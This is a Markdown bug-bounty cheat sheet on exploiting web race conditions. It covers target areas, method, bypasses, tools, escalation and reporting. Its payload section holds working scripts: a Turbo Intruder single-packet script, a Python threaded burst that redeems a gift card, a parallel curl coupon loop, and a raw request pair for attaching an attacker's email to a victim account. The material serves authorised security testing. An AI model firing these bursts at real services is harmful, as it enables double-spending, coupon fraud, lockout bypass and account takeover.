# Race Conditions
> One-line summary: fire the same state-changing request many times in a single instant so overlapping checks pass — double-spend, double-redeem, and limit overruns pay well.

## Overview
A race condition exists when a security or business decision (balance check, coupon validity, one-time-use flag, rate-limit counter) is made on state that another concurrent request can change before the decision is persisted. Modern web apps multiplex requests over HTTP/2, so the window is often single-digit milliseconds — but the single-packet attack collapses network jitter and makes even sub-millisecond windows reliably exploitable. Typical impact: redeeming a coupon/gift card/voucher N times, withdrawing more than the balance, bypassing rate limits and 2FA attempt counters, creating duplicate resources, or an edit conflict that rewrites another user's data. Also see the limit-overrun and multi-endpoint variants covered by PortSwigger's research.

## Where to find it
- Payment and redemption: gift cards, vouchers, coupon apply/redeem, wallet transfers, withdrawals, refunds, tipping
- One-time actions: OTP verify, invite acceptance, voting/likes, "claim" buttons, first-purchase discounts
- Counters: rate limits, quota consumption, referral credits, "x downloads left", 2FA attempt counters
- Balance checks: buy-with-credit, prepaid top-ups, points redemption, seat/inventory allocation
- Multi-endpoint races: `add to cart` vs `checkout`, `confirm email` vs `delete account`, `change password` vs `login`
- File operations: upload to a fixed path while another process reads/writes it (config, cache, temp files)
- DB-backed logic: SELECT-then-INSERT without a unique constraint (duplicate account, double booking)
- Hidden/unusual windows: state transitions where a value is validated, then re-read later (TOCTOU)
- Anywhere a "once" is enforced by application code rather than a DB constraint or atomic operation

## Methodology
1. Predict collisions: list every endpoint where two identical or closely-timed requests would produce a state that breaks a rule (balance < 0, coupon used twice, two records where one is allowed).
2. Probe for clues: measure the endpoint's behavior under concurrency with a small burst (5-10) and look for double-processing, 500s, or inconsistent responses. Benchmark baseline sequential latency first.
3. Warm up the connection: send one or two throwaway requests to complete TLS/HTTP2 setup so the real burst isn't delayed by handshakes.
4. Choose your primitive by protocol:
   - HTTP/2 target → single-packet attack (Burp "Send group in parallel", Turbo Intruder with `Engine.BURP2`, or h2spacex).
   - HTTP/1.1 target → last-byte sync (Turbo Intruder HTTP/1 engine with `concurrentConnections=50`) or a threads+barrier script.
5. Send 20-30 identical requests in one batch. Start at 20; escalate to 30 if the window feels narrow. Do not go to hundreds — you add jitter and noise.
6. Confirm on the *resulting state*, not the responses: check wallet balance, coupon list, order count, or inventory after the burst. Responses may all say "success" while only one applied.
7. If nothing hits, widen: try N=30, add a slight stagger (10-20ms), and try mixing endpoints (e.g., one coupon-apply + one checkout) in the same batch.
8. Consider multi-endpoint races: the collision may be between two *different* requests (confirm-email vs login, cart-add vs checkout).
9. For file-system races, look for temp-file paths (`/tmp/...`, predictable names) being written then executed/parsed.
10. Prove impact with the smallest demonstrable gain and stop: one extra redemption, one negative balance, one duplicated record.

## Payloads
Turbo Intruder — single-packet attack (HTTP/2), the canonical race script:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```
Use the built-in template `race-single-packet-attack.py` in Turbo Intruder's examples as the base; the request must be a full raw request in the editor.

Threads + barrier (works over HTTP/1.1, ~1-5ms spread — good enough for lax windows):
```python
import threading, requests

URL = "https://target.com/api/giftcard/redeem"
HEADERS = {"Authorization": "Bearer TOKEN_A", "Content-Type": "application/json"}
BODY = '{"code":"GIFT10"}'
N = 30
barrier = threading.Barrier(N)
results = []

def hit():
    s = requests.Session()
    barrier.wait()          # release all threads at once
    try:
        r = s.post(URL, headers=HEADERS, data=BODY, timeout=10)
        results.append((r.status_code, r.text[:80]))
    except Exception as e:
        results.append(("ERR", str(e)))

threads = [threading.Thread(target=hit) for _ in range(N)]
[t.start() for t in threads]
[t.join() for t in threads]
for r in results:
    print(r)
print("successes:", sum(1 for c, _ in results if c == 200))
```
Check the resulting balance afterwards — that is the real measure:
```bash
curl -s -H "Authorization: Bearer TOKEN_A" https://target.com/api/wallet
```

Parallel curl with a shared start (bash, HTTP/1.1, decent for lenient apps):
```bash
for i in $(seq 1 30); do
  curl -s -X POST https://target.com/api/coupon/apply \
    -H "Authorization: Bearer TOKEN_A" \
    -H "Content-Type: application/json" \
    -d '{"code":"SINGLE20"}' -o "race_$i.txt" &
done
wait
grep -l '"applied":true' race_*.txt | wc -l
```

Raw request pair for a multi-endpoint race (confirm-email vs attach-to-account):
```http
POST /api/email/confirm HTTP/2
Host: target.com
Content-Type: application/json

{"token":"TOKEN_FROM_ATTACKER"}

# raced simultaneously with:
POST /api/account/email/attach HTTP/2
Host: target.com
Authorization: Bearer TOKEN_VICTIM
Content-Type: application/json

{"email":"attacker@example.com"}
```

Burp Repeater single-packet attack (no scripting):
```text
1. Send the request once.
2. Duplicate the tab 20-30x (Ctrl+R).
3. Right-click the tab -> Add tab to group -> New group.
4. Right-click the group -> "Send group in parallel (single-packet attack)".
5. Compare responses; then check server state (balance/coupon used flags).
```
There is also a one-click "Race Condition Custom Action for Burp Repeater" (PortSwigger) that duplicates, sends in parallel, and opens result tabs.

## Bypasses & edge cases
- The server may serialize per-connection: force multiple connections (`concurrentConnections=1` is for single-packet attack, but for last-byte sync use 20-30 separate connections).
- Gateway/load balancer can route your burst to different backends, breaking the race — retry, and keep the bursts back-to-back so they land on the same instance.
- HTTP/1.1 `Connection: close` changes timing; keep-alive with `Connection: keep-alive` is usually better, but Turbo Intruder's engines handle this.
- Sub-millisecond windows need single-packet attack; last-byte sync tops out around a few ms spread.
- Rate-limited endpoints may drop the whole burst; mix with connection warming and slightly lower N.
- Idempotency keys or DB unique constraints kill the race — if the burst produces one success and 29 "already used", the design is atomic; move on.
- Race on *reset* operations: e.g., reset a counter by racing the increment; or race an OTP request against the attempt counter to never hit "locked".
- Race the session: login twice concurrently during a session rotation and check for a token that survives (auth-adjacent races).
- File-write races: upload two different files to the same generated path; whichever wins is served to other users (cache poisoning).
- Multi-endpoint consideration: the collision may be between "cancel order" and "refund order", or "downgrade plan" and "generate invoice".
- Don't confuse application-level double-submit idempotency with a race: verify by checking DB state (two rows, two credits).

## Tools
- Burp Suite Pro: Repeater "Send group in parallel (single-packet attack)", plus the Turbo Intruder BApp.
- Turbo Intruder (official): https://github.com/PortSwigger/turbo-intruder — use the `race-single-packet-attack.py` example:
```text
Extender -> Turbo Intruder -> Attack -> script: race-single-packet-attack.py
Request: paste the exact raw HTTP/2 request
```
- h2spacex: https://github.com/nxenon/h2spacex — low-level HTTP/2 single-packet attack library (Scapy-based) when you need frame-level control or the target needs custom TLS fingerprints.
- Racer (Sakurity): https://github.com/sakurity/racer — Chrome extension sniffs a live request, Node server `racer.js` replays it ~5x in parallel. Run the server geographically close to the target for µs-level timing.
- requests-racer (NCC Group): https://github.com/nccgroup/requests-racer — Python helper that synchronizes request sending:
```python
import requests
from requests_racer import SynchronizedAdapter
s = requests.Session()
s.mount("https://", SynchronizedAdapter())
# then issue your N requests as usual; they are released together
```
- Race The Web: https://github.com/thehackerdev/race-the-web — YAML-defined race tests with a REST API, useful for retesting after fixes.
- h2csmuggler: https://github.com/BishopFox/h2csmuggler — not a race tool per se, but useful when HTTP/2 handling at the edge hides backend endpoints or bypasses front-end controls:
```bash
python3 h2csmuggler.py -x https://target.com/ --test
```
- PayloadsAllTheThings race section for extra primitives: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md

## Escalation & chaining
- Coupon/voucher double-redeem → direct financial loss; quantify with a loop (10 coupons → $N credit).
- Wallet/withdrawal race → balance goes negative or transfer executes twice → double-spend.
- OTP/attempt-counter race → brute force without lockout (chains straight into authentication.md attacks).
- Inventory race → oversell, or reserve N units while paying for one.
- Email/ownership race → confirm attacker's email on victim's account (pre-ATO), or set a password reset token twice.
- Rate-limit race → bypass per-minute limits on SMS/email senders (costs the company money), brute-force endpoints, and API quotas.
- File-write race → replace a file that another user's session will load (stored XSS/cache poisoning if path is guessable).
- Combine with business-logic.md: races are the multiplier on every "once per user" rule.

## Report notes
- The single most important evidence: state before, the burst, state after. Show the wallet going from $10 to -$40, or two identical coupons marked "used".
- Include the exact script/tool and parameters (N=30, single-packet attack, HTTP/2) so a triager can reproduce; note timing sensitivity honestly.
- If reproduction is flaky (e.g., 1 in 5 bursts), say so and include a video/GIF of a successful run plus the raw HTTP transcript.
- Quantify the ceiling: "each burst yields N redemptions; the loop is automatable, so this scales to $X/hour".
- Note whether the race also produces duplicate emails/SMS (abuse) even when no monetary gain — still valid but lower severity.
- For multi-endpoint races, diagram the two requests and the interleaving you observed (include server logs if provided, otherwise the observable state change).
- Credit any prior art you built on (e.g., the single-packet attack research) — triagers recognize the technique and reproduce faster.

## References
- [PortSwigger Research: Smashing the state machine — the true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine)
- [PortSwigger: New techniques and tools for web race conditions](https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)
- [PortSwigger Academy: Race conditions](https://portswigger.net/web-security/race-conditions)
- [HackTricks: Race Condition](https://book.hacktricks.wiki/en/pentesting-web/race-condition.html)
- [PayloadsAllTheThings: Race Condition](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md)
- [OWASP WSTG: Testing for Race Conditions](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/)
